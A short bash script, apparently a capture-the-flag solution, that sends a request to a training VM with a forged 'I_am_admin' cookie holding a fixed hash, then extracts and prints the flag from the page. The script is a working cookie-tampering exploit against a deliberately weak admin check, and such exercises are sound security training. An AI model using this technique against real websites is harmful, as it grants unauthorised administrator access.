#!/bin/bash

echo "input the VM ip address :"
read ip

url="http://${ip}/"

response=$(curl -s -b "I_am_admin=b326b5062b2f0e69046810717534cb09" "$url" | grep "Flag")
response=$(cut -f2 -d ":" <<< $response | cut -c -65)
echo "FLAG:${response}"